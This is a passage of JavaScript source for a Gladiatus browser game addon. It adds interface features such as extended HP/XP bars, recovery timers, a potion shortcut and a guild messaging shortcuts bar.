/*
 * Addon Global Script
 * Author: DarkThanos, GreatApo
 */

// Global
var gca_global = {
	// Pre Inject code
	preinject : function(){
		// If player id is not detected
		if (gca_section.playerId <= 0 || gca_section.sh == null) {
			// Wait for it to be detected
			gca_tools.event.addListener('player-id-updated', () => {
				if (gca_section.playerId <= 0) return;
				this.preinject();
			});
			// Try to detect
			this.detectPlayerId.run();
			return;
		}

		// Gladiatus site fixes & improvements
		if (gca_options.bool("global", "gladiatus_site_fixes"))
			document.documentElement.className += " glfix";	
		// Custom page scrollbar
		if (gca_options.bool("global","gca_custom_scrollbar"))
			document.documentElement.className += " gca_custom_scrollbar";		
		// Lock all sections
		if (gca_options.bool("global","lock_section_visibility"))
			document.documentElement.className += " lock_section_visibility";
		
		// Hide expedition button
		if (gca_options.bool("global","bar_hide_exp_btn"))
			document.documentElement.className += " bar_hide_exp_btn";
		// Hide dungeon button
		if (gca_options.bool("global","bar_hide_dun_btn"))
			document.documentElement.className += " bar_hide_dun_btn";
		// Hide arena button
		if (gca_options.bool("global","bar_hide_are_btn"))
			document.documentElement.className += " bar_hide_are_btn";
		// Hide circus button
		if (gca_options.bool("global","bar_hide_ct_btn"))
			document.documentElement.className += " bar_hide_ct_btn";
		
		// Hide City Gate menu entry
		if (gca_options.bool("main_menu","menu_hide_citygate"))
			document.documentElement.className += " menu_hide_citygate";
		
		// Merge menu merchants into one
		if (gca_options.bool("main_menu","menu_merge_merchants"))
			document.documentElement.className += " menu_merge_merchants";
		// Merge menu items into one
		if (gca_options.bool("main_menu","menu_merge_items"))
			document.documentElement.className += " menu_merge_items";

		// Resolve Game Modes
		this.gameModePreResolve();		

		// If Event bar was active
		(gca_data.section.get("cache", "event_bar_active", 0) && (gca_options.bool("global","shortcuts_bar") || gca_options.bool("global","auction_status_bar") || gca_options.bool("global","extended_hp_xp_info")) &&
			this.display.event_bar_move.preload());
		// If submenu click to change
		(gca_options.bool("main_menu","submenu_click_to_change") && 
			this.display.advanced_main_menu.submenuClickToChangeTab.preload());
		// Hide flags
		(gca_options.bool("global","hide_language_flags") &&
			this.display.hideLanguageFlags.preload());

		// If rtl server
		if (localStorage.getItem('gca_rtl')) {
			document.documentElement.classList.add("gca_rtl");
		}
		// If x-scroll
		(gca_options.bool("global","x_scroll") && 
			this.display.xScrollFix());
		// If Item shadow
		(gca_options.bool("global","item_shadow") && 
			this.display.analyzeItems.itemShadow.preload());
		// If Inventory options group
		(gca_options.bool("global","inventory_options_group") &&
			this.display.inventoryOptionsGroup.preload());
		
		// Accessibility
		(gca_options.bool("accessibility","white_level_indicators") &&
			document.documentElement.classList.add("accessibility-white-level-indicators"));
		(gca_options.bool("accessibility","qualty_symbols_indicators") &&
			document.documentElement.classList.add("accessibility-quality-symbols-indicators"));
		(gca_options.bool("accessibility","tooltips_qualty_white") &&
			document.documentElement.classList.add("accessibility-tooltips-quality-white"));
		(gca_options.bool("accessibility","tooltips_qualty_symbols") &&
			document.documentElement.classList.add("accessibility-tooltips-quality-symbols"));

		// Image Cache
		//this.background.preserve_image_cache.preload();

		// If mobile add css class
		if (this.isMobile) {
			document.documentElement.classList.add("gca_mobile_device");
		}
		// If dirty
		if (gca_tools.easter_eggs.isDirty()) {
			document.documentElement.classList.add("gca_is_dirty");
		}
	},
	// Inject Code
	inject : function(){
		// If player id is not detected
		if (gca_section.playerId <= 0 || gca_section.sh == null) {
			// Wait for it to be detected
			gca_tools.event.addListener('player-id-updated', () => {
				if (gca_section.playerId <= 0) return;
				this.inject();
			});
			// Try to detect
			this.detectPlayerId.run();
			return;
		}

		// Resolve Game Modes
		this.gameModeResolve();
		// Resolve Page direction
		this.pageDirectionResolve();

		// If server backup
		if (this.isServerBuckup) {
			this.backup.inject();
			return;
		}
		// Server Service wait screen
		if (!this.isLoggedIn) {
			return;
		}
		
		// Image Cache
		//this.background.preserve_image_cache.load();

		// Extended info on Health and Experience bars
		if (gca_options.bool("global","extended_hp_xp_info"))
			this.display.extended_hp_xp.info();
		else if (gca_options.bool("global","extended_hp_xp_info_potion"))
			this.display.extended_hp_xp.life_potion_shortcut.create(false);

		// Minutes left for full life
		(gca_options.bool("global","hp_timer_for_full_life") && 
			this.display.extended_hp_xp.timerForFullLife());
		// Show Expedition Recover
		(!this.isInUnderworld && gca_options.bool("global","expedition_dungeon_points_recover_timer") && 
			this.display.showPointsRecover.init());
		
		// Buttons' main bar
		(gca_options.bool("global","shortcuts_bar") &&
			this.display.shortcuts_bar.create());

		// Display auction status
		(!this.isTraveling && 
			this.display.auction_status_bar.create());

		// Event bar move
		((gca_options.bool("global","shortcuts_bar") || gca_options.bool("global","auction_status_bar") || gca_options.bool("global","extended_hp_xp_info")) &&
			this.display.event_bar_move.load());

		// Integrate top fixed bar
		(gca_options.bool("global","top_fixed_bar") && 
			this.display.top_fixed_bar.create());

		// Advance main menu
		(gca_options.bool("main_menu","advance_main_menu") && 
			this.display.advanced_main_menu.create());
		
		// Advance main menu - submenu click to change
		(gca_options.bool("main_menu","submenu_click_to_change") && 
			this.display.advanced_main_menu.submenuClickToChangeTab.apply());
		
		// Make traveling display fixes
		(this.isTraveling &&
			this.display.traveling_style_fixes());
		
		// Bind auction last search
		(!this.isTraveling && gca_options.bool("auction","save_last_state") && 
			this.display.auctionLoadLastState());

		// Attacked Timers
		(gca_options.bool("global","attacked_timers") &&
			this.display.attacked_timers.inject());

		// Quests Timer
		(!this.isTraveling && gca_options.bool("main_menu","quest_timer") &&
			this.display.quests_timer.inject());

		// Merchants Timer
		(!this.isTraveling && gca_options.bool("main_menu","merchants_timer") &&
			this.display.merchants_timer.inject(this));

		// Global Arena Timer
		(gca_options.bool("global","global_arena_timer") &&
			this.display.global_arena.inject());
			
		// Welcome message
		this.welcomeMessage.inject();	

		// Inventory options group
		(gca_options.bool("global","inventory_options_group") &&
			this.display.inventoryOptionsGroup.create());
		// Inventory info box
		(gca_options.bool("global","inventory_gold_info") &&
			this.display.inventoryInfo.prepare());

		// Daily Bonus Log
		(gca_options.bool("overview", "daily_bonus_log") && 
			this.background.daily_bonus_log.inject());

		// If Item shadow
		if(gca_options.bool("global","item_shadow")) {
			this.display.analyzeItems.itemShadow.inventory();
			this.display.analyzeItems.itemShadow.shop();
		}

		// Event Craps Timer
		(!this.isTraveling && this.isEvent.craps && gca_options.bool("events","craps_timer") &&
			this.display.event.craps_timer.inject());

		// Event Server Quest
		(!this.isTraveling && (this.isEvent.serverQuest || this.isEvent.locationQuest) && this.isEvent.bar && gca_options.bool("events","server_quest_timer") &&
			this.display.event.server_quest_timer.inject());

		// Remember merchants' and inventory tabs
		(!this.isTraveling && (gca_options.bool("global","remember_tabs") || gca_options.bool("market","remember_sort")) && 
			this.background.targetLinkEditor.init());

		// Cooldown Sound Notification for missions, dungeons and arenas
		(!this.isTraveling && gca_options.bool("sound","cooldown_sound_notifications") && 
			this.background.notify_me.cooldown_sounds.init());


		// Notification : Guild application alert
		(!this.isTraveling && gca_options.bool("global","notify_new_guild_application") && 
			this.background.notify_me.new_guild_application());
		
		// Notification : Guild attack ready alert
		(!this.isTraveling && gca_options.bool("global","notify_guild_attack_ready") && 
			this.background.notify_me.guild_attack_ready());
			
		// Notification: Minimum health warning
		((gca_options.get("global", "health_warning") > 0) &&
			this.background.notify_me.healthWarning());	

		// Get pinned guild message
		(!this.isTraveling && gca_options.bool("global","check_guild_pinned_message") && 
			this.background.guildPinnedMessage());

		// Pray Buf shortcut
		(this.isInUnderworld && gca_options.bool("global","pray_shorcut") &&
			this.underworld.prayCounterBar.add());
		// Expendition shortcut always pointing to the last location
		(this.isInUnderworld &&
			this.underworld.updateExpenditionLink());

		// Browser notifications
		(gca_options.bool("global","browser_notifications") &&
			gca_notifications._browser.init());
		
		// Gold/Exp data
		(gca_options.bool("global","gold_exp_data") &&
			this.background.gold_exp_data.inject());
			
		// Forge timer
		(!this.isTraveling && gca_options.bool("main_menu","forge_timers") &&
			this.display.forge_timer());
		
		// Centurion & PowerUps timers
		(gca_options.bool("main_menu","centurio_powerups_timers") &&
			this.centurio_days.init());
		
		// 24h guild info update
		this.update_guild_info();
		
		// Show durability or notifications
		((gca_options.get("global", "show_durability") != 0 || gca_options.get("global", "min_durability") > 0) && gca_section.mod!='auction' &&
			this.display.analyzeItems.itemDurability.init());			

		// Show forge info
		(!this.isTraveling && gca_options.get("global", "show_forge_info") != 0 && 
			this.display.analyzeItems.itemForgeInfo.init());
		
		// Edit Mercenaries tooltips
		(gca_options.bool("global","show_mercenaries_real_name_and_combat_stats") &&
			this.display.analyzeItems.mercenaries.init());

		// Show upgrade item value on item
		(gca_options.bool("global","show_upgrade_values") &&
			this.display.analyzeItems.itemUpgrades.init());

		// Mobile item move helper - Run on mobiles
		(this.isMobile &&
			this.accessibility.item_move.init());

		// Display links on footer
		this.display.footerLinks();

		// Gladiatus 4.2.0 top links in one line fix
		[... document.querySelectorAll('#header_game span a')].forEach((link) => {
			if (link.getOffsets().y > 50) {
				link.style.marginLeft = 0;
				link.style.marginRight = 0;
			}
		});

		// Clean trash
		this.maid.clean();

		// INFO: Testing the error detection feature
		// throw new Error('123');
	},
	
	scripts : {
		chartScript : {
			load : 0, // 2 = ready
			create : function(render){
				// Load moment.js
				gca_tools.load.script('libraries/moment.js', () => {
					// Load chart.js
					gca_tools.load.script('libraries/Chart.min.js', () => {
						render();
					}, true);
				}, true);
			}
		}
	},

	// Game Modes Check
	gameModePreResolve : function(){
		this.isMobile = false;
		// If android
		if (navigator.userAgent.toLowerCase().indexOf('android') > -1) {
			this.isMobile = true;
		}
	},
	gameModeResolve : function(){
		// Default Values
		this.isLoggedIn = true;
		this.isServerBuckup = false;
		this.isTraveling = false;
		this.isInUnderworld = false;

		// Check for events
		this.isEvent = {
			craps : false,
			serverQuest : false,
			locationQuest : false,
			bar : false
		};

		// Logged Out
		if (document.getElementById('login')){
			this.isLoggedIn = false;
			return;
		}
		// If server backup
		else if (document.getElementById('container_infobox')){
			this.isLoggedIn = false;
			this.isServerBuckup = true;
			return;
		}
		// Check if traveling
		else if(document.getElementById('submenu1') == null){
			this.isTraveling = true;
		}
		// Otherwise Check if is Underworld
		else if(document.getElementById('wrapper_game').className == 'underworld'){
			this.isInUnderworld = true;
		}

		if(!this.isTraveling){
			// Get first's submenu links
			let links = document.getElementById('submenu1').getElementsByTagName('a');
			// Check for "Dice roll" event
			if(links[0].className.match('glow') && links[0].href.match('mod=craps')){
				this.isEvent.craps = true;
			}
			// Get second's submenu links
			links = document.getElementById('submenu2').getElementsByTagName('a');
			if(links[links.length-1].className.match('glow')){
				// Check for "Server Bosses" event
				if(links[links.length-1].href.match('submod=serverQuest')){
					this.isEvent.serverQuest = true;
				}else if(links[links.length-1].href.match(/loc=(\w+)&/)){
					this.isEvent.locationQuest = links[links.length-1].href.match(/loc=(\w+)&/)[1];
				}
			}
		}

		if(document.getElementById("banner_event_link")){
			this.isEvent.bar = true;
		}
	},

	// Resolve page direction
	pageDirectionResolve : function(){
		
		// fix crash from Dark Mode addon (the insert a couple of <link> elements with no href before the gladiatus css files)
		let s = 0; //skip counter
		for (var i = 1; i < document.querySelectorAll('link').length - 1 ; i++) {
			if (document.querySelectorAll('link')[i].getAttribute("href") != null && document.querySelectorAll('link')[i+1].getAttribute("href") != null)
				break;
			else
				s++;
		}
		
		// Check page direction ltr or rtl
		if(
			// Check if the rtl css exists on the page
			!document.querySelector("link[href$='/cdn57/270eb6a1a8de3fd98cd920e0a396ed.css'], link[href$='/cdn0c/bc5ca92d0773302a4c1745ad5f8d8c.css']")
		){
			window.gca_rtl = false;
			if (localStorage.getItem('gca_rtl')) {
				localStorage.removeItem('gca_rtl');
				document.documentElement.classList.remove("gca_rtl");
			}
			return;
		}

		/*
		// Force left-to-right
		let links = document.querySelectorAll('link');
		for (var i = links.length - 1; i >= 0; i--) {
			if (links[i].getAttribute("href").match("rtl"))
				links[i].href = links[i].getAttribute("href").replace(/rtl_?/, '');
		}
		window.gca_rtl = false;
		localStorage.removeItem('gca_rtl');
		return;
		*/
	
		// Else its a right to left server
		window.gca_rtl = true;
		document.documentElement.classList.add("gca_rtl");

		// Enable if disabled
		if (!localStorage.getItem('gca_rtl'))
			localStorage.setItem('gca_rtl', 'true');
	},
	
	//Welcome message, runs only once
	welcomeMessage: {
	    inject: function (){
	        if (gca_data.get("welcomeOnce", true)) {
	            var modal = new gca_tools.Modal(
	                    gca_locale.get("global", "welcome_addon"),
	                    null,
	                    () => {
	                    modal.destroy();
	                },
	                    () => {
	                    window.open('https://github.com/DinoDevs/GladiatusCrazyAddon/releases', '_blank'),
	                    modal.show();
	                });
	            modal.img.src = gca_resources.folder + 'icons/icon_64.png';
	            modal.body("✔️" + " " + gca_locale.get("global", "welcome_version") + " " + "v" + gca.version + ".");
	            modal.button(gca_locale.get("general", "ok"), true);
	            modal.button(gca_locale.get("global", "welcome_changelog"), false);
	            modal.show();
	            gca_data.set("welcomeOnce", false);
	        }
	    }
	},

	// Display stuff
	display : {

		// Footer notes
		footerLinks : function () {
			var footerLinks = document.getElementsByClassName('footer_links');
			if (footerLinks.length == 0) return;

			var gca_links = document.createElement('div');
			gca_links.id = 'gca-footer-links';
			gca_links.style.display = 'inline-block';
			footerLinks[0].appendChild(gca_links);

			if (!window.gca_rtl) {
				this.reddit(gca_links);
				this.version(gca_links);
			}
			else {
				this.version(gca_links);
				this.reddit(gca_links);
			}
		},
		
		// Display the GCA version on the bottom of the page
		version : function(wrapper){
			// Create a gca link
			var link = document.createElement('a');
			link.href = gca.homepage;
			link.setAttribute('target', '_blank');
			link.textContent = gca.shortName + ' v' + gca.version;
			
			// Create a link seperator
			wrapper.appendChild(document.createTextNode(' | '));
			// Insert link
			wrapper.appendChild(link);
		},
		
		// Display the Reddit link on the bottom of the page
		reddit : function(wrapper){
			// Create a reddit link
			let link = document.createElement('a');
			link.href = gca_links.get('unofficial-reddit');
			link.setAttribute('target', '_blank');
			link.textContent = 'Unofficial Reddit';
			
			// Create a link separator
			wrapper.appendChild(document.createTextNode(" | "));
			// Insert link
			wrapper.appendChild(link);
		},
		
		// Traveling
		traveling_style_fixes : function () {
			let header = document.getElementById('header_game');
			header.className += ' gca-traveling';
			
			// Disable Pantheon
			if ( document.getElementsByClassName(" gca_advance_main_menu").length > 0 ){
				let pantheon_menu_entry = document.getElementsByClassName("advanced_menu_entry")[1];
				pantheon_menu_entry.style.filter = "grayscale(100%)";
				pantheon_menu_entry.getElementsByTagName("a")[0].removeAttribute("href");
				pantheon_menu_entry.getElementsByTagName("a")[1].removeAttribute("href");
			}else{
				let pantheon_menu_entry = document.getElementsByClassName("menuitem")[1];
				pantheon_menu_entry.style.filter = "grayscale(100%)";
				pantheon_menu_entry.removeAttribute("href");
			}
			// Disable Recruitment
			let recruitment_menu_entry = document.getElementsByClassName("menuitem")[4];
			recruitment_menu_entry.style.filter = "grayscale(100%)";
			recruitment_menu_entry.removeAttribute("href");
			
		},

		// Points recover timers
		showPointsRecover : {
			init : function() {
				// Find server speed
				let server_speed = gca_tools.time.serverSpeed();

				// Show timers
				this.showTimer('expedition', server_speed);
				this.showTimer('dungeon', server_speed);
				
				// Show dungeon points if hidden (eg. when in Britannia)
				this.showDungeon();
			},
			showDungeon : function(){
				if(!document.getElementById("icon_dungeonpoints"))
					return;
				
				if( document.getElementById("icon_dungeonpoints").parentNode.style.display == "none" ){
					document.getElementById("icon_dungeonpoints").parentNode.style.display = "block";
					document.getElementById("icon_dungeonpoints").parentNode.style.filter = "grayscale(100%)";
					document.getElementById("icon_dungeonpoints").parentNode.style.opacity = 0.4;
				}
			},
			showTimer: function(type, server_speed) {
    			// Expedition tooltip div
    			let icon = document.getElementById('icon_' + type + 'points');
    			if (!icon) return; // Exit if icon is not found

    			// Get tooltip
    			let tooltip;
    			try {
        			tooltip = JSON.parse(icon.dataset.tooltip);
    			} catch (e) {
        		return; // Exit if tooltip is not found or cannot be parsed
    			}
    
    			// Get recovery rate
			let recover_rate = tooltip?.[0]?.[1]?.[0]?.match(/\d+/);
			if (!recover_rate) return;
			recover_rate = parseInt(recover_rate[0], 10);
			recover_rate = (recover_rate + 100) / 100;

    			// Get points left to fill
    			let point_max_elem = document.getElementById(type + 'points_value_pointmax');
    			let point_elem = document.getElementById(type + 'points_value_point');
    			if (!point_max_elem || !point_elem) return; // Exit if point elements are not found
    
    			let point_missing = parseInt(point_max_elem.innerText, 10) - parseInt(point_elem.innerText, 10);
    			if (isNaN(point_missing) || point_missing === 0) return; // Exit if point calculation is invalid or nothing to do

    			// Get time left for next point
    			let next_point = tooltip[0][2][0].match(/(\d+):(\d+)/);
    			if (next_point) {
        			let now = new Date(gca_tools.time.server());
        			now.setSeconds(0);
        			let next = new Date(now.getTime());
        			next.setHours(parseInt(next_point[1], 10));
        			next.setMinutes(parseInt(next_point[2], 10));
        			next_point = (next - now) / (1000 * 60);
        			if (next_point < 0) {
            				next.setDate(next.getDate() + 1);
           				 next_point = (next - now) / (1000 * 60);
        			}
    			} else {
        			next_point = Math.round((90 / server_speed) / recover_rate);
   			 }

    				// Find recover time in hours and minutes
    				let minutes = (Math.round((90 / server_speed) / recover_rate) * (point_missing - 1)) + next_point;
    				let hours = Math.floor(minutes / 60);
    				minutes = minutes % 60;

    				// Convert them to text
    				hours = hours === 0 ? '' : ' ' + hours + ' ' + gca_locale.get("general", "hours");
    				minutes = minutes === 0 ? '' : ' ' + minutes + ' ' + gca_locale.get("general", "minutes");

    				// Show timer
    				tooltip[0].push([[gca_locale.get("global", type + "_recover_full") + hours + minutes], ["#BA9700","#BA9700"]]);
    				gca_tools.setTooltip(icon, JSON.stringify(tooltip));
		}
	},
		
		// Extended Health and Experience bars
		extended_hp_xp : {
			// Display More info
			info : function(){
				// Extend HP bar and XP bar, more info
				document.getElementById('header_values_hp').className = "header_values_hp_extend";
				document.getElementById('header_values_xp').className = "header_values_xp_extend";

				// Get HP and XP
				var hp = document.getElementById('header_values_hp_bar').dataset.tooltip.match(/"(\d+) \\\/ (\d+)"/i);
				var xp = document.getElementById('header_values_xp_bar').dataset.tooltip.match(/"(\d+) \\\/ (\d+)"/i);

				// Extend Background
				var div = document.createElement('div');
				div.id = "header_values_hp_xp_background";
				document.getElementById('header_game').appendChild(div);
				
				// Insert HP info
				div = document.createElement('div');
				div.id = "header_values_hp_points";
				var text = document.createElement('span');
				text.textContent = gca_tools.strings.insertDots(hp[1]);
				div.appendChild(text);
				text = document.createTextNode(" / " + gca_tools.strings.insertDots(hp[2]));
				div.appendChild(text);
				document.getElementById('header_values_hp').appendChild(div);
				
				// Insert XP info
				div = document.createElement('div');
				div.id = "header_values_xp_points";
				text = document.createElement('span');
				text.textContent = gca_tools.strings.insertDots(xp[1]);
				div.appendChild(text);
				text = document.createTextNode(" / " + gca_tools.strings.insertDots(xp[2]));
				div.appendChild(text);
				document.getElementById('header_values_xp').appendChild(div);

				// Display Healing Pot
				(gca_options.bool("global","extended_hp_xp_info_potion") && 
					this.life_potion_shortcut.create(this));
			},

			// Life Potion Shortcut
			life_potion_shortcut : {
				// Create interface
				create : function(extended_hp_xp){
					// Save parent instance
					this.extended_hp_xp = extended_hp_xp;

					// Create Healing Pot button
					var link = document.createElement('a');
					link.id = extended_hp_xp ? 'header_life_pot' : 'header_life_pot_only';
					link.dataset.tooltip = JSON.stringify([[['<img style="width:20px;" align="absmiddle" src="' + gca_tools.img.cdn('img/premium/token/18.jpg') + '"> ' + gca_locale.get("global", "life_potion_use"),"#fdfdfd"]]]);
					
					// On click callback
					link.addEventListener('click', () => {
						// try to use a Healing Pot
						this.tryToUsePotion();
					}, false);
					
					// Insert button on page
					if (extended_hp_xp) {
						document.getElementById('header_values_hp').appendChild(link);
					}
					else {
						document.getElementById('header_values_hp').parentNode.appendChild(link);
					}
				},

				// Try to use a Potion
				using : false,
				tryToUsePotion : function(){
					// Atomicity check
					if(this.using) return;
					this.usageSet(true);

					// Get Potions Number
					var self = this;
					this.getPotionsNumber(function(potions, life){
						self.usePotion(potions, life);
					});
				},
				usageSet : function(lock){
					// Lock/Unlock
					this.using = lock;

					// Display usage
					var link = document.getElementById('header_life_pot');
					if(link)
						link.className = (lock)?"disabled":"";
				},

				usePotion : function(potions, life){
					// Check if life is full
					if (life[0]) {
						this.usageSet(false);
						// Report Error
						gca_notifications.warning( JSON.parse(document.getElementById('header_values_hp_bar').dataset.tooltip)[0][0][0][0] + " 100%" );
						return;
					}
					if (potions == 0) {
						this.usageSet(false);
						gca_notifications.error(
							gca_locale.get("global", "life_potion_left", {number:0})
						);
						return;
					}

					// Use Potion
					jQuery.get(gca_getPage.link({"mod":"premium","submod":"inventoryActivate","feature":"18","token":potions}), (content) => {
						// Get life info
						var life = this.parseLifeFromHtml(content);

						this.usageSet(false);

						// Report success
						gca_notifications.success(
							gca_locale.get("global", "life_potion_used") +
							" (" + (potions-1) + " " + gca_locale.get("global", "life_potion_left", {number: potions-1}) + ")"
						);
						// Update HP
						if (this.extended_hp_xp) this.extended_hp_xp.updateLife(life[1], life[2]);
					})
					// If Request Failed
					.fail(() => {
						this.usageSet(false);
						// Report Error
						gca_notifications.error(gca_locale.get("general", "error"));
					});
				},

				// Get Potion Number
				getPotionsNumber : function(callback){
					// Load premium inventory page
					jQuery.get(gca_getPage.link({"mod":"premium","submod":"inventory"}), (content) => {
						// Match potion number
						var potions = content.match(/document\.location\.href='index\.php\?mod=premium&submod=inventoryActivate&feature=18&token=(\d+)&sh=/);
						potions = potions ? parseInt(potions[1], 10) : 0;

						// Get life info
						var life = this.parseLifeFromHtml(content);

						// Update HP
						if (this.extended_hp_xp) this.extended_hp_xp.updateLife(life[1],life[2]);

						// Return result
						callback(potions, life);
					});
				},

				parseLifeFromHtml : function(html){
					// Get life info
					var life = html.match(/<div\s+id="header_values_hp_bar"\s+class="header_values_bar"\s+data-max-value="(\d+)"\s+data-value="(\d+)"\s+data-regen-per-hour="(\d+)"/m);

					// If not found
					if(!life) life = [0, 0, 0];

					var info = [parseInt(life[1], 10), parseInt(life[2], 10), parseInt(life[3], 10)];
					// Push in frond true/false if life is full/notfull
					info.unshift( info[0] == info[1] );

					// Return life info
					return info;
				}
			},

			// Update HP
			updateLife : function(hp, maxhp){
				var div;
				// Update HP info
				if (document.getElementById('header_values_hp_points')) {
					div = document.getElementById('header_values_hp_points');
					div.textContent = "";
					var text = document.createElement('span');
					text.textContent = gca_tools.strings.insertDots(hp);
					div.appendChild(text);
					text = document.createTextNode(" / " + gca_tools.strings.insertDots(maxhp));
					div.appendChild(text);
				}
				// Get HP bar
				div = document.getElementById('header_values_hp_bar_fill');
				// Stop HP bar's animation
				jQuery(div).stop();
				// Update HP bar
				div.style.width = Math.round((hp * 100) / maxhp) + "%";
				// Update Tooltip
				div = document.getElementById('header_values_hp_bar');
				if (div) {
					var lifeTooltip = JSON.parse(div.dataset.tooltip);
					lifeTooltip[0][0][0][1] = hp + " / " + maxhp;
					// Remove Timer for Full Life
					if (lifeTooltip[0].length >= 14) {
						lifeTooltip[0].pop();
					}
					gca_tools.setTooltip(div, JSON.stringify(lifeTooltip));
					// Update Timer for Full Life
					if (gca_options.bool("global","hp_timer_for_full_life")) {
						this.timerForFullLife();
					}
				}
			},

			// Timer for full life
			timerForFullLife : function(){
				// Life tooltip div
				var div = document.getElementById('header_values_hp_bar');
				// Get tooltip
				var lifeTooltip = JSON.parse(document.getElementById('header_values_hp_bar').dataset.tooltip);
				// Get Life Points
				var hp = lifeTooltip[0][0][0][1].match(/(\d+)\s+\/\s+(\d+)/);
				// Return if life is full
				if(hp[1] == hp[2]) return;
				// Get Life Points restore rate
				var restore = parseInt(lifeTooltip[0][5][0][1].match(/(\d+)/)[1], 10);

				// Calculate minutes left to full life
				var minutes_left = Math.ceil(((parseInt(hp[2], 10) - parseInt(hp[1], 10)) * 60) / restore);
				// Return if 0 minutes
				if(minutes_left <= 0) return;
				
				// Convert minutes to hours 00:00
				var hours_left = Math.floor(minutes_left / 60);
				minutes_left = minutes_left % 60;
				
				var hours_left_text = (hours_left == 0) ? '' : hours_left + " " + gca_locale.get("general", "hours");
				// Add data on the tooltip
				lifeTooltip[0].push([[gca_locale.get("global", "life_recover_full") + " " + hours_left_text + " " + minutes_left + " " + gca_locale.get("general", "minutes")], ["#BA9700","#BA9700"]]);
				gca_tools.setTooltip(div, JSON.stringify(lifeTooltip));
			}
		},

		// Shortcuts Buttons Bar
		shortcuts_bar : {
			create : function(){
				// Make a button bar with icon-links
				var shortcutsBar = document.createElement('div');
				shortcutsBar.id = "gca_shortcuts_bar";

				// Move bar if there is a space
				if(!gca_options.bool("global","extended_hp_xp_info"))
					shortcutsBar.className = "noExtendedHpXpInfo";

				// Get active buttons (ex 'msg|gmd' means message and guild medic)
				var activeButtons = gca_options.get("global","shortcuts_bar_buttons");
				if(activeButtons){
					activeButtons.split('|');
				}
				else{
					activeButtons = [];
				}

				// Temporary Variables
				var button, link;

				// If player has no Guild
				if(!gca_data.section.get("guild", "inGuild", false)){
					// Create a "Sent Private message" button
					if(activeButtons.indexOf("msg") >= 0){
						button = document.createElement('div');
						button.className = "icon-out";
						link = document.createElement('a');
						link.className = "icon message-icon";
						link.href = gca_getPage.link({"mod":"messages","submod":"messageNew"});
						link.title = gca_locale.get("global", "message_private_write");
						button.appendChild(link);
						shortcutsBar.appendChild(button);
					}
				}

				// If player has Guild
				else{

					// Create "Sent guild message" button
					if(activeButtons.indexOf("msg") >= 0){
						let instant_message_div = document.createElement('div');
						instant_message_div.className = "instant_message_div instant";
						instant_message_div.style.display = "none";
						// Create Extended Layout to sent message
						{
							let div = document.createElement('div');
							div.className = "hover_box";

							let temp = document.createElement('i');
							temp.textContent = gca_locale.get("global", "message_guild_write") + ":";
							div.appendChild(temp);

							temp = document.createElement('br');
							div.appendChild(temp);

							let textareaDiv = document.createElement('div');
							textareaDiv.className = "textarea_wrapper";
							div.appendChild(textareaDiv);

							let loading = document.createElement('div');
							loading.className = "loading";
							textareaDiv.appendChild(loading);

							let textarea = document.createElement('textarea');
							textarea.dataset.sendGuildMessage = "true";
							textareaDiv.appendChild(textarea);

							// Cache message on keypress
							textarea.value = gca_data.section.get("cache", "guild_message", '');
							textarea.addEventListener('keyup', function(){
								gca_data.section.set("cache", "guild_message", this.value);
							}, false);
							textarea.addEventListener('change', function(){
								gca_data.section.set("cache", "guild_message", this.value);
							}, false);

							// Initialize on window exit
							gca_tools.event.onExit.init();

							temp = document.createElement('input');
							temp.type = "button";
							temp.className = "button1";
							temp.value = gca_locale.get("global", "message_send");
							temp.addEventListener('click', function(){
								// Check if sending...
								if (loading.style.display == "block") return;

								// Get message
								var msg = textarea.value;
								// Get exclude me data
								var exclude_me = (document.getElementById('qgm_exclude_me').checked) ? true : false;

								// Don't send small messages
								if(msg.length == 0) return;

								// Set pending action
								gca_tools.event.onExit.listen(
									'guild_message',
									// Not even displayed
									'You are sending a message!\nAre you sure you want to leave the page?'
								);

								// Disable message
								loading.style.display = "block";
								// Send message
								var send = gca_global.background.guildMessage.send(textarea.value, exclude_me, function(ok){
									// Enable messages
									loading.style.display = "none";
									if (ok) {
										textarea.value = "";
										gca_data.section.del("cache", "guild_message");
										if (!gca_tools.easter_eggs.check()) {
											gca_notifications.success(gca_locale.get("global", "message_sent_success"));
										}
									} else {
										gca_notifications.error(gca_locale.get("global", "message_sent_failed"));
									}
									gca_tools.event.onExit.remove('guild_message');
								});
								if(!send){
									loading.style.display = "none";
									gca_notifications.error(gca_locale.get("general", "no_data"));
									gca_tools.event.onExit.remove('guild_message');
								}
							}, false);
							div.appendChild(temp);

							temp = document.createElement('input');
							temp.type = "checkbox";
							temp.id = "qgm_exclude_me";
							div.appendChild(temp);

							temp = document.createElement('label');
							temp.setAttribute("for", "qgm_exclude_me");
							temp.id = "qgm_exclude_me";
							temp.textContent = gca_locale.get("global", "message_exclude_me");
							div.appendChild(temp);
							
							instant_message_div.appendChild(div);
						}

						// Create Button layout
						button = document.createElement('div');
						button.className = 'icon-out';

						link = document.createElement('a');
						link.className = 'icon message-icon';
						link.href = gca_getPage.link({"mod":"guild","submod":"adminMail"});
						link.title = gca_locale.get("global", "message_guild_write");

						button.appendChild(link);
						button.appendChild(instant_message_div);
						shortcutsBar.appendChild(button);

						button.addEventListener('mouseover', function(){
							jQuery(instant_message_div).stop().fadeIn("fast");
						}, false);
						button.addEventListener('mouseout', function(){
							if(document.activeElement.dataset.sendGuildMessage != "true")
								jQuery(instant_message_div).stop().fadeOut("fast");
						}, false);
					}
					
					// Links not During traveling
					if( !gca_global.isTraveling ){

						// Create a Link to guild's medical center
						if(activeButtons.indexOf("gmd") >= 0){
							button = document.createElement('div');
							button.className = "icon-out";
							link = document.createElement('a');
							link.className = "icon cross-icon";
							link.href = gca_getPage.link({"mod":"guild_medic"});
							link.title = gca_locale.get("global", "guild_medic_goto");
							button.appendChild(link);
							shortcutsBar.appendChild(button);
						}
						
						// Create a Link to guild's market
						if(activeButtons.indexOf("gmr") >= 0){
							button = document.createElement('div');
							button.className = "icon-out";
							link = document.createElement('a');
							link.className = "icon market-icon";
							link.href = gca_getPage.link({"mod":"guildMarket"});
							link.title = gca_locale.get("global", "guild_market_goto");
							button.appendChild(link);
							shortcutsBar.appendChild(button);
						}
						
						// Create a Link to guild's storage
						if(activeButtons.indexOf("gst") >= 0){
							let tab = gca_data.section.get("cache", "guild_storage_tab", 1);

							button = document.createElement('div');
							button.className = "icon-out";
							link = document.createElement('a');
							link.className = "icon box-icon";
							link.href = gca_getPage.link({"mod":"guildStorage", "subsub":tab});
							link.title = gca_locale.get("global", "guild_storage_goto");
							button.appendChild(link);
							shortcutsBar.appendChild(button);
						}
						
						// Create a Link to guild's bank
